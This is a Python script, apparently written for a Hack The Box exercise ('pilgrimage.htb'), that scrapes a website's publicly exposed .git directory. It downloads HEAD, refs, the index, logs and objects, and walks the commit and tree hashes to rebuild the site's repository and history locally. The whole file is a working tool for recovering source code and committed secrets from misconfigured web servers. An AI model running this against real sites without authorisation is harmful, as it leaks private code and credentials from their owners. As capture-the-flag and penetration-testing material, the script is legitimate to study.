import requests
import json
import base64
import binascii
import os
import sys
from pathlib import Path
import subprocess

def is_hash(hash):
    if len(hash) != 40:
        print('[-] is_hash: not a hash with length 40')
        return False
    for i,c in enumerate(hash):
        if ord(c)<32 or ord(c)>127:
            print('[-] is_hash: funny characters in the hash')
            return False
    return True

def printer(data):
    """ Print data """
    # TODO add tab cr lf as printables

    print('\n-----BEGIN----------------------------------------')
    for i, c in enumerate(data):
        if len(c)>1:
            #print('Binary?')
            for j,d in enumerate(c):
                if ord(d) in {9,10,13}:
                    print(d, end='')
                elif ord(d)<32 or ord(d)>127:
                    print('.', end='')
                else:
                    print(d, end='')
        elif len(c)==0:
            print('\n***** len 0? ******\n')
        else:
            if ord(c)<32 or ord(c)>127:
                print('.', end='')
            else:
                print(c, end='')
    print('')
    print('\n-----END  ----------------------------------------')


#run local command to check what the type is
def cat_file_type(hash):
    """
    git cat-file -t 208167e785aae5b052a4a2f9843d74e733fbd917
    commit
    """
    try:
        return subprocess.check_output(['git', 'cat-file', '-t', hash]).decode().strip()
    except subprocess.CalledProcessError as err:
        print(f'[-] {err}')
    return ''

#run cat-file producing a list
def cat_file_pretty_tree():
    try:
        return subprocess.check_output(['git', 'cat-file', '-p', 'master^{tree}']).decode().strip()
    except subprocess.CalledProcessError as err:
        print(f'[-] {err}')
    return ''

def cat_file_pretty(hash):
    """pretty print"""
    try:
        return subprocess.check_output(['git', 'cat-file', '-p', hash]).decode().strip()
    except subprocess.CalledProcessError as err:
        print(f'[-] {err}')
    return ''


def valid(resp):
    #fragment = binascii.hexlify(resp.content[:10])
    #print(f'[?] Code {resp.status_code} begins with "{fragment}"')
    if resp.status_code == 200:
        if '404 Error' in resp.text:
            return False
    elif resp.status_code >= 400:
        return False
    return True


def save(filename, data):
    if len(data) == 0:
        return
    parent = Path(filename).parent
    if not parent.exists():
        parent.mkdir(parents=True)
    with open(filename, 'wb') as file:
        file.write(data)
    print(f'[+] save: {len(data)} bytes in {filename}')

hashes = {}


def handle_hash(sha1):
    print('')
    sha1 = sha1.strip()
    if not is_hash(sha1):
        print('[-] handle_hash: stop here. being called with binary?')
        exit()
    if sha1 == '0000000000000000000000000000000000000000':
        print('[+] handle_hash: skip inital zeroes')
        return  # skip the starting hash
    if sha1 in hashes:
        print('[+] handle_hash: already retrieved '+sha1)
        return  # already done
    if len(sha1) == 40:
        print('[+] handle_hash: new hash '+sha1)
        hashes.update({sha1:''})

        name = f'{sha1[:2]}/{sha1[2:]}'
        #print(f'[+] Adding sha1 {sha1} as {name}')
        d = dld(f'objects/{name}')
        if d == False:
            print('[-] handle_hash: the download failed?')
            return
        print('[+] handle_hash: downloaded')

        res = cat_file_type(sha1)
        print(f'[+] handle_hash: detected type as: "{res}"')
        #hashes.update({sha1: res})
        if not res == 'blob':
            print('[+] handle_hash: calling handle_pretty for '+sha1)
            handle_pretty(cat_file_pretty(sha1), res)
        else:
            print('[+] handle_hash: blob is not further processed for '+sha1)
    else:
        print(f'[-] handle_hash: ERROR Unexpected sha1 "{sha1}" len {len(sha1)}')
        exit()


def handle_pretty(data, git_type):
    # check if it is indeed pretty or still a blob
    tlen=len(data)
    tested = 0
    for i,cc in enumerate(data):
        tested = tested + 1
        c = ord(cc)  # fix
        if c==10 or c==13 or c==9:
            continue
        elif c>=32 and c<127:
            continue
        else:
            print(f'[-] handle_pretty: DATA IS BINARY {c} with total length {tlen}')
            return
    print(f'[ ] handle_pretty: tested {tested} of {tlen} length')
    print(f'[+] handle_pretty: called with {git_type} and size {len(data)}')

    lines = str(data).strip().split('\n')
    lc = len(lines)

    printer(lines)

    for line in lines:
        #print(f'[P] LINE: {line}')
        parts = line.split(None)  # splits on space tab ?
        #print(f'[p] LINE: {parts}')
 
        if len(parts) > 1:
            if parts[0] == 'parent':
                #print(f'  parent >>> {parts[1]}')
                handle_hash(parts[1])
            elif len(parts) > 2 and parts[1] == 'parent':
                #print(f'  parent >>- {parts[2]}')
                handle_hash(parts[2])
            elif parts[0] == 'tree':
                #print(f'  tree   >>> {parts[1]}')
                handle_hash(parts[1])
            elif len(parts) > 2 and parts[1] == 'tree':
                #print(f'  tree   >>- {parts[2]}')
                handle_hash(parts[2])
            elif parts[0] == 'blob':
                #print(f'  blob   >>> {parts[1]}')
                handle_hash(parts[1])
            elif len(parts) > 2 and parts[1] == 'blob':
                #print(f'  blob   >>- {parts[2]}')
                handle_hash(parts[2])
            else:
                print(f'[ ] handle_pretty: TODO {len(parts)} parts = {parts}')
                pass
        else:
            #print(f'   <<< stop ')
            #return  # REST is text ?
            pass

def handle_master(filename, data):
    lines = data.strip().split('\n')
    lc = len(lines)
    #print(f'[*] handle {lc} lines')

    print(f'\n[+] handle_master: for {filename} and size {len(data)}, printing;')
    printer(data)

    print(f'[+] handle_master: assuming text lines, number of lines {len(lines)}')
    for line in lines:
        parts = line.split(' ')
        if len(parts) == 1 and len(parts[0]) == 40:
            #print(f'[*] > found hash {parts[0]}')
            handle_hash(parts[0])

        elif len(parts) == 2 and parts[0] == 'ref:':
            #print(f'[*] > found ref {parts[1]}')
            dld(f'{parts[1]}')

        elif len(parts) > 2 and len(parts[0]) == 40 and len(parts[1]) == 40:
            #print(f'[*] > found two refs')
            #print(f'[*] > {line}')

            handle_hash(parts[0])
            handle_hash(parts[1])

        elif line.startswith('#'):
            pass  # comment

        elif len(parts) == 2 and len(parts[0]) == 40 and parts[1].startswith('refs'):
            handle_hash(parts[0])
            dld(parts[1])

        elif len(parts) == 3 and len(parts[0])==6 and len(parts[1])==4 and '\t' in parts[2]:
            # parts[1] is tree or blob
            # parts[2] is hash tab name
            hn = parts[2].split('\t')
            print(f'[+] dld: via index for type {parts[1]}, name {hn[1]}, hash {hn[0]}')
            handle_hash(hn[0])

        else:
            print(f'[#] handle_master: pattern is not yet enabled; parts {len(parts)} ')
            for i,c in enumerate(line):
                if ord(c)<32 or ord(c)>127:
                    print('.', end='')
                else:
                    print(c, end='')

def dld(git):
    """
    Download / CURL / Save / Parse
    Do not specify '.git/'
    """
    url = f'{base_url}{git}'
    response = requests.get(url, timeout=None) # the magick file takes over 2 minutes!
    print(f'[ ] dld: GET {url} {response.status_code}')

    if valid(response):
        #
        git_name = f'.git/{git}'
        data = response.text  # text
        cont = response.content  # binary
        print(f'[+] dld: data in {git_name}')
        save(git_name, cont)

        #
        if git_name.endswith('HEAD'):
            handle_master(git_name, data)
        elif git_name.endswith('master'):
            handle_master(git_name, data)
        elif git_name.endswith('main'):
            handle_master(git_name, data)
        elif git_name.endswith('packed-refs'):
            handle_master(git_name, data)
        elif git_name.endswith('.git/index'):
            if data[0:4] == 'DIRC':   # Dir Cache format
                print('[+] dld: DIRC index')
                pt = cat_file_pretty_tree()
                print(f'[+] dld: TREE TO LOOK INTO: \n{pt}')
                handle_master('cat_file index', pt)
            else:
                print('[+] dld: skipping index since it is binary')
        elif git_name.endswith('.git/description'):
            print('[+] dld: skipping description since it has no hashes')
        elif git_name.endswith('.git/config'):
            print('[+] dld: skipping config since it has no hashes')
        elif git_name.endswith('.git/COMMIT_EDITMSG'):
            print('[+] dld: skipping COMMIT_EDITMSG since it is free text')
        else:
            print(f'[-] dld: not yet handled {git_name}')
            #handle_master(git_name, data)

        return True

    else:
        #print(f'[-] ERROR Invalid call {git}')
        return False


#base_url = 'http://pilgrimage.htb/.git/'

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: {} http://websitewith.git/.git/".format((sys.argv[0])))
        sys.exit(0)
    base_url = sys.argv[1]

    dld_list = [
        'HEAD',
        'objects/info/packs', # file with pack list
        'objects/info/alternates', # with with list of paths to other object stores
        'objects/info/http-alternates', # file with list of URL to alternate object stores
        'description',
        'config',
        'config.worktree',
        'COMMIT_EDITMSG',
        'index', # binary format index
        'packed-refs',  # same as refs/heads/, refs/tags/ etc
        'refs/heads/master',
        'refs/heads/main',
        'refs/remotes/origin/HEAD',
        'refs/stash',
        'logs/HEAD',
        'logs/refs/heads/master',
        'logs/refs/heads/main',
        'logs/refs/remotes/origin/HEAD',
        'info/refs',  # file
        'info/grafts', # file
        'info/exclude', # file
        'info/attributes',
        'info/sparse-checkout',
        'remotes', # legacy
        'shallow', # internally used
        'commondir',
    ]
    for fn in dld_list:
        dld(fn)

    #for k, v in hashes.items():
    #    print(f'{k} = {v}')


    print('** When complete: git reset --hard')
